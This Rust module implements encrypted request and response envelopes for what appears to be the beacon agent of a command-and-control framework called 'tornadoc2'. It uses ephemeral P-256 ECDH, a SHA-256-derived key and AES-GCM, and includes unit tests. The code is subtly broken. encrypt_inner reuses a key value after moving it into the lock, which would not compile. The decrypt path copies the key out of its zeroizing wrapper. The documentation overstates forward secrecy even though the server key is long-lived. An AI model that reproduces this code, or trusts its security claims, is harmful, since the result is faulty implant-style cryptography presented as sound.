//! Wire encryption.
//!
//! Replaces `crypto/wire.go`. The public surface is
//! `WireSession::new(server_pub_b64)`, `encrypt_request`,
//! `decrypt_response`, `rotate_ephemeral`, `epk_base64`, and the
//! free function `is_envelope`.
//!
//! # Key derivation
//!
//! The wire key is `SHA-256(shared_secret || "tornadoc2-wire-v2")`.
//! This is **not** HKDF — the pivot protocol uses HKDF-SHA256
//! with its own info string, and the two are deliberately
//! distinct. Changing this construction breaks wire compatibility
//! with any Go agent still deployed, so it is fixed at `v2`.
//!
//! # Forward secrecy
//!
//! Every `encrypt_request` generates a fresh ephemeral P-256
//! keypair, sends the public half in the envelope's `epk` field,
//! and derives the shared secret against the server's long-lived
//! public key. The server replies encrypted under the same
//! shared secret. The next request generates another keypair.
//!
//! Consequence: a passive observer who captures one
//! request/response pair cannot decrypt any other pair; a process
//! memory dump that recovers the current ephemeral key decrypts
//! only the response that matches it.
//!
//! # Thread safety
//!
//! `WireSession` is `Send + Sync`. `encrypt_request` takes
//! `&self` and updates the ephemeral under an `RwLock`; multiple
//! tasks may not call `encrypt_request` concurrently (the
//! protocol is single-outstanding-request by design, and the
//! beacon loop enforces it), but the type does not prevent it.
//! If you need concurrent encryption, wrap in a `tokio::sync::Mutex`
//! at the call site — the `RwLock` here is per-operation, not
//! per-session-lifetime.

use std::borrow::Cow;
use std::sync::RwLock;

use aes_gcm::{
    aead::{Aead, Payload},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use p256::{
    ecdh::diffie_hellman,
    elliptic_curve::sec1::ToEncodedPoint,
    PublicKey, SecretKey,
};
use rand_core::{OsRng, RngCore};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use thiserror::Error;
use zeroize::Zeroizing;

/// Wire protocol version. Sent in the `enc` field of every
/// envelope and used as the AES-GCM additional data.
const WIRE_VERSION: &str = "v2";

/// Key-derivation info string. Concatenated with the shared
/// secret and SHA-256'd. Distinct from the pivot protocol's
/// `tornadoc2-pivot-v2` — the two protocols derive keys
/// independently and must not be cross-wired.
const WIRE_INFO: &[u8] = b"tornadoc2-wire-v2";

/// AES-GCM nonce size, fixed at 12 bytes by the spec.
const NONCE_SIZE: usize = 12;

/// Errors from wire-session construction and operation.
///
/// Every variant names the specific failure mode so the beacon
/// loop can log a diagnostic the operator can act on. The
/// variants are coarse on purpose — a fine-grained errno dump
/// would be `io::Error`-shaped, and the beacon loop is not the
/// place to be clever about which syscall failed.
#[derive(Debug, Error)]
pub enum WireError {
    #[error("wire: base64 decode: {0}")]
    Base64(#[from] base64::DecodeError),

    #[error("wire: invalid P-256 public key: {0}")]
    BadPublicKey(#[from] p256::elliptic_curve::Error),

    #[error("wire: JSON: {0}")]
    Json(#[from] serde_json::Error),

    #[error("wire: encrypted session, response is not JSON: {0}")]
    NotJson(serde_json::Error),

    #[error("wire: encrypted session, response has no enc field")]
    MissingEnc,

    #[error("wire: encrypted session, unsupported enc {0:?} (want {1:?})")]
    UnsupportedVersion(String, &'static str),

    #[error("wire: envelope missing {0}")]
    MissingField(&'static str),

    #[error("wire: bad nonce length: {0} (want {NONCE_SIZE})")]
    BadNonceLength(usize),

    #[error("wire: encrypt failed: {0}")]
    Encrypt(String),

    #[error("wire: decrypt failed: {0}")]
    Decrypt(String),
}

/// Wire-encryption session.
///
/// `Disabled` mirrors the Go tree's `nil *WireSession` — every
/// method on it is a no-op that passes the input through
/// unchanged, and `was_encrypted` is `false`. The beacon loop
/// constructs the session once from
/// `config::SERVER_ECDH_PUBKEY_B64`; an empty string yields
/// `Disabled`, a non-empty string yields `Enabled`.
pub enum WireSession {
    /// Wire encryption is off. The agent speaks plaintext over
    /// whatever transport is configured.
    Disabled,

    /// Wire encryption is on.
    Enabled {
        /// The server's long-lived P-256 public key. Immutable
        /// after construction.
        peer: PublicKey,

        /// Mutable session state: the current ephemeral keypair
        /// and the shared secret derived from it.
        inner: RwLock<Inner>,
    },
}

struct Inner {
    /// Current ephemeral private key. Rotated on every
    /// `encrypt_request`.
    priv_key: SecretKey,

    /// Current shared secret. `SHA-256(shared || WIRE_INFO)`.
    /// Wrapped in `Zeroizing` so it is wiped on drop and on
    /// every rotation.
    key: Zeroizing<[u8; 32]>,
}

impl WireSession {
    /// Construct a session from the server's base64-encoded
    /// P-256 public key.
    ///
    /// An empty string returns `WireSession::Disabled`, matching
    /// the Go tree's `return nil, nil` on an empty key. A
    /// malformed key returns `WireError::BadPublicKey`; the
    /// beacon loop should treat this as a build error, not a
    /// runtime error — the key is baked in at build time.
    pub fn new(server_pub_b64: &str) -> Result<Self, WireError> {
        if server_pub_b64.is_empty() {
            return Ok(Self::Disabled);
        }
        let raw = STANDARD.decode(server_pub_b64)?;
        let peer = PublicKey::from_sec1_bytes(&raw)?;
        let (priv_key, key) = derive_ephemeral(&peer);
        Ok(Self::Enabled {
            peer,
            inner: RwLock::new(Inner { priv_key, key }),
        })
    }

    /// Encrypt a request body.
    ///
    /// In the `Disabled` case, returns the plaintext unchanged
    /// (borrowed, no copy). In the `Enabled` case, rotates the
    /// ephemeral keypair, encrypts under the new key, and
    /// returns the JSON envelope.
    ///
    /// **The rotation happens before encryption.** The envelope
    /// carries the new public half in `epk`; the server derives
    /// the same shared secret from it and encrypts its response
    /// under the same key. `decrypt_response` then uses that
    /// key, so the request/response pair must be the most
    /// recent one before the next `encrypt_request`.
    pub fn encrypt_request<'a>(
        &self,
        plaintext: &'a [u8],
    ) -> Result<Cow<'a, [u8]>, WireError> {
        match self {
            Self::Disabled => Ok(Cow::Borrowed(plaintext)),
            Self::Enabled { peer, inner } => {
                Ok(Cow::Owned(encrypt_inner(peer, inner, plaintext)?))
            }
        }
    }

    /// Decrypt a response body.
    ///
    /// Returns `(plaintext, was_encrypted)`. In the `Disabled`
    /// case, `was_encrypted` is `false` and the body is passed
    /// through borrowed. In the `Enabled` case, `was_encrypted`
    /// is `true` and the body is decrypted into an owned
    /// `Vec<u8>`.
    ///
    /// **On a pivot transport, check `is_envelope(body)`
    /// first.** A child's tasks request carries no `epk` (there
    /// is no header channel through a pivot), so the server has
    /// no shared secret and responds in plaintext. The pivot
    /// tunnel's own AEAD is the integrity layer for that hop.
    /// `decrypt_response` on a plaintext body returns
    /// `WireError::MissingEnc`, which the pivot code must treat
    /// as "forward verbatim," not as a failure.
    pub fn decrypt_response<'a>(
        &self,
        body: &'a [u8],
    ) -> Result<(Cow<'a, [u8]>, bool), WireError> {
        match self {
            Self::Disabled => Ok((Cow::Borrowed(body), false)),
            Self::Enabled { inner, .. } => {
                let pt = decrypt_inner(inner, body)?;
                Ok((Cow::Owned(pt), true))
            }
        }
    }

    /// Rotate the ephemeral keypair and return the new public
    /// half, base64-encoded.
    ///
    /// `encrypt_request` calls this internally; the method is
    /// public only for parity with the Go tree, where it was
    /// exported. In practice, callers should not need to
    /// rotate manually — every `encrypt_request` already does.
    /// In the `Disabled` case, returns an empty string.
    pub fn rotate_ephemeral(&self) -> Result<String, WireError> {
        match self {
            Self::Disabled => Ok(String::new()),
            Self::Enabled { peer, inner } => {
                let (priv_key, key) = derive_ephemeral(peer);
                let epk_b64 = encode_epk(&priv_key);
                let mut guard = inner
                    .write()
                    .expect("wire session lock poisoned");
                guard.priv_key = priv_key;
                guard.key = key;
                Ok(epk_b64)
            }
        }
    }

    /// Return the current ephemeral public key, base64-encoded.
    ///
    /// In the `Disabled` case, returns an empty string. In the
    /// `Enabled` case, returns whatever the most recent
    /// `encrypt_request` or `rotate_ephemeral` produced.
    pub fn epk_base64(&self) -> String {
        match self {
            Self::Disabled => String::new(),
            Self::Enabled { inner, .. } => {
                let guard = inner
                    .read()
                    .expect("wire session lock poisoned");
                encode_epk(&guard.priv_key)
            }
        }
    }
}

/// Report whether `body` parses as a wire envelope.
///
/// Answers one question only: did the peer choose to encrypt
/// this response, or did it send plaintext? It does **not**
/// validate the `enc` version, the IV, the ciphertext, or the
/// GCM tag — that is `decrypt_response`'s job.
///
/// The distinction matters on pivot transports: a plaintext
/// response from the server (or a plaintext error the server
/// sent before reaching the envelope layer) must be forwarded
/// verbatim, not treated as a decryption failure. The pivot
/// code calls `is_envelope` first, and only calls
/// `decrypt_response` when it returns `true`.
///
/// The check is deliberately lenient: any non-empty `enc` field
/// counts as an envelope. A future `v3` envelope answers `true`
/// here and is rejected with a version error inside
/// `decrypt_response`, which is the correct diagnostic.
pub fn is_envelope(body: &[u8]) -> bool {
    if body.is_empty() {
        return false;
    }
    #[derive(Deserialize)]
    struct Probe {
        #[serde(default)]
        enc: String,
    }
    serde_json::from_slice::<Probe>(body)
        .map(|p| !p.enc.is_empty())
        .unwrap_or(false)
}

// =====================================================================
// Internal helpers
// =====================================================================

/// Generate a fresh ephemeral keypair against `peer` and derive
/// the shared secret.
///
/// The key is `SHA-256(shared || WIRE_INFO)` — 32 bytes for
/// AES-256. The `Zeroizing` wrapper ensures the key is wiped
/// when the caller drops it or overwrites it.
fn derive_ephemeral(peer: &PublicKey) -> (SecretKey, Zeroizing<[u8; 32]>) {
    let priv_key = SecretKey::random(&mut OsRng);
    let shared = diffie_hellman(
        priv_key.to_nonzero_scalar(),
        peer.as_affine(),
    );

    let mut hasher = Sha256::new();
    hasher.update(shared.raw_secret_bytes().as_slice());
    hasher.update(WIRE_INFO);
    let mut key = Zeroizing::new([0u8; 32]);
    key.copy_from_slice(hasher.finalize().as_slice());

    (priv_key, key)
}

/// Base64-encode an uncompressed SEC1 public key. The `false`
/// argument to `to_encoded_point` means uncompressed; that is
/// the format the server expects.
fn encode_epk(priv_key: &SecretKey) -> String {
    STANDARD.encode(
        priv_key.public_key().to_encoded_point(false).as_bytes(),
    )
}

/// The on-wire envelope, outbound form. All four fields are
/// always present.
#[derive(Serialize)]
struct EnvelopeOut {
    enc: String,
    epk: String,
    iv: String,
    ct: String,
}

/// The on-wire envelope, inbound form. `epk` is ignored on
/// decrypt — the client already holds the ephemeral that
/// matches it — and omitted here so serde drops it without
/// allocating.
#[derive(Deserialize)]
struct EnvelopeIn {
    enc: String,
    iv: Option<String>,
    ct: Option<String>,
}

fn encrypt_inner(
    peer: &PublicKey,
    inner: &RwLock<Inner>,
    plaintext: &[u8],
) -> Result<Vec<u8>, WireError> {
    // Rotate the ephemeral first, matching the Go tree. The
    // envelope's `epk` is the public half of the key that
    // encrypts this request; the server derives the same
    // shared secret from it.
    let (priv_key, key) = derive_ephemeral(peer);
    let epk_b64 = encode_epk(&priv_key);

    // Commit the new state before encrypting so that a
    // concurrent `epk_base64` sees the key that matches the
    // envelope, even in the unlikely event of a race.
    {
        let mut guard = inner.write().expect("wire session lock poisoned");
        guard.priv_key = priv_key;
        guard.key = key;
    }

    // Encrypt under the key we just derived.
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key.as_ref()));
    let mut nonce_bytes = [0u8; NONCE_SIZE];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ct = cipher
        .encrypt(
            nonce,
            Payload {
                msg: plaintext,
                aad: WIRE_VERSION.as_bytes(),
            },
        )
        .map_err(|e| WireError::Encrypt(format!("{e}")))?;

    let env = EnvelopeOut {
        enc: WIRE_VERSION.to_string(),
        epk: epk_b64,
        iv: STANDARD.encode(&nonce_bytes),
        ct: STANDARD.encode(&ct),
    };
    Ok(serde_json::to_vec(&env)?)
}

fn decrypt_inner(
    inner: &RwLock<Inner>,
    body: &[u8],
) -> Result<Vec<u8>, WireError> {
    let env: EnvelopeIn = serde_json::from_slice(body)
        .map_err(WireError::NotJson)?;

    if env.enc.is_empty() {
        return Err(WireError::MissingEnc);
    }
    if env.enc != WIRE_VERSION {
        return Err(WireError::UnsupportedVersion(
            env.enc,
            WIRE_VERSION,
        ));
    }
    let iv_b64 = env.iv.as_deref().unwrap_or("");
    let ct_b64 = env.ct.as_deref().unwrap_or("");
    if iv_b64.is_empty() || ct_b64.is_empty() {
        return Err(WireError::MissingField("iv or ct"));
    }

    let iv = STANDARD.decode(iv_b64)?;
    let ct = STANDARD.decode(ct_b64)?;
    if iv.len() != NONCE_SIZE {
        return Err(WireError::BadNonceLength(iv.len()));
    }

    // Snapshot the current key. The lock is released before
    // the AES work so a slow decrypt does not block the
    // session.
    let key = {
        let guard = inner.read().expect("wire session lock poisoned");
        *guard.key
    };

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&key));
    let nonce = Nonce::from_slice(&iv);
    cipher
        .decrypt(
            nonce,
            Payload {
                msg: &ct,
                aad: WIRE_VERSION.as_bytes(),
            },
        )
        .map_err(|e| WireError::Decrypt(format!("{e}")))
}

// =====================================================================
// Tests
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn make_server_key() -> (SecretKey, String) {
        let secret = SecretKey::random(&mut OsRng);
        let pub_b64 = STANDARD.encode(
            secret.public_key().to_encoded_point(false).as_bytes(),
        );
        (secret, pub_b64)
    }

    /// Server-side key derivation. Duplicates the client's
    /// `derive_ephemeral` from the server's perspective so the
    /// test exercises the wire format without needing a live
    /// server.
    fn server_derive_key(
        server_secret: &SecretKey,
        client_epk_b64: &str,
    ) -> [u8; 32] {
        let epk_bytes = STANDARD.decode(client_epk_b64).unwrap();
        let client_pub =
            PublicKey::from_sec1_bytes(&epk_bytes).unwrap();
        let shared = diffie_hellman(
            server_secret.to_nonzero_scalar(),
            client_pub.as_affine(),
        );
        let mut hasher = Sha256::new();
        hasher.update(shared.raw_secret_bytes().as_slice());
        hasher.update(WIRE_INFO);
        let mut key = [0u8; 32];
        key.copy_from_slice(hasher.finalize().as_slice());
        key
    }

    #[test]
    fn round_trip_request_response() {
        let (server_secret, server_pub_b64) = make_server_key();
        let wire = WireSession::new(&server_pub_b64).unwrap();

        // --- Client encrypts a request ---
        let plaintext = b"hello, server";
        let envelope = wire.encrypt_request(plaintext).unwrap();
        assert!(matches!(wire, WireSession::Enabled { .. }));

        // --- Server decrypts and responds ---
        #[derive(Deserialize)]
        struct Env {
            enc: String,
            epk: String,
            iv: String,
            ct: String,
        }
        let env: Env = serde_json::from_slice(&envelope).unwrap();
        assert_eq!(env.enc, WIRE_VERSION);

        let key = server_derive_key(&server_secret, &env.epk);
        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&key));
        let iv = STANDARD.decode(&env.iv).unwrap();
        let ct = STANDARD.decode(&env.ct).unwrap();
        let pt = cipher
            .decrypt(
                Nonce::from_slice(&iv),
                Payload {
                    msg: &ct,
                    aad: WIRE_VERSION.as_bytes(),
                },
            )
            .unwrap();
        assert_eq!(pt, plaintext);

        // --- Server encrypts a response under the same key ---
        let mut resp_iv = [0u8; NONCE_SIZE];
        OsRng.fill_bytes(&mut resp_iv);
        let resp_ct = cipher
            .encrypt(
                Nonce::from_slice(&resp_iv),
                Payload {
                    msg: b"hello, client",
                    aad: WIRE_VERSION.as_bytes(),
                },
            )
            .unwrap();
        let resp_env = serde_json::json!({
            "enc": WIRE_VERSION,
            "iv": STANDARD.encode(resp_iv),
            "ct": STANDARD.encode(&resp_ct),
        });
        let resp_body = serde_json::to_vec(&resp_env).unwrap();

        // --- Client decrypts the response ---
        let (pt, was_enc) = wire.decrypt_response(&resp_body).unwrap();
        assert!(was_enc);
        assert_eq!(pt.as_ref(), b"hello, client");
    }

    #[test]
    fn disabled_passes_through() {
        let wire = WireSession::new("").unwrap();
        assert!(matches!(wire, WireSession::Disabled));

        let plaintext = b"hello";
        let out = wire.encrypt_request(plaintext).unwrap();
        assert_eq!(out.as_ref(), plaintext);

        let (out, was_enc) = wire.decrypt_response(b"response").unwrap();
        assert_eq!(out.as_ref(), b"response");
        assert!(!was_enc);
    }

    #[test]
    fn envelope_missing_enc_is_error_when_enabled() {
        let (_, server_pub_b64) = make_server_key();
        let wire = WireSession::new(&server_pub_b64).unwrap();
        let err = wire.decrypt_response(br#"{"iv":"x","ct":"y"}"#);
        assert!(matches!(err, Err(WireError::MissingEnc)));
    }

    #[test]
    fn envelope_wrong_version_is_error() {
        let (_, server_pub_b64) = make_server_key();
        let wire = WireSession::new(&server_pub_b64).unwrap();
        let err =
            wire.decrypt_response(br#"{"enc":"v3","iv":"x","ct":"y"}"#);
        assert!(matches!(
            err,
            Err(WireError::UnsupportedVersion(_, _))
        ));
    }

    #[test]
    fn is_envelope_cases() {
        assert!(is_envelope(br#"{"enc":"v2","iv":"x","ct":"y"}"#));
        assert!(is_envelope(br#"{"enc":"v3"}"#)); // lenient
        assert!(!is_envelope(b""));
        assert!(!is_envelope(b"{}"));
        assert!(!is_envelope(br#"{"enc":""}"#));
        assert!(!is_envelope(b"not json"));
        assert!(!is_envelope(b"[]"));
    }
}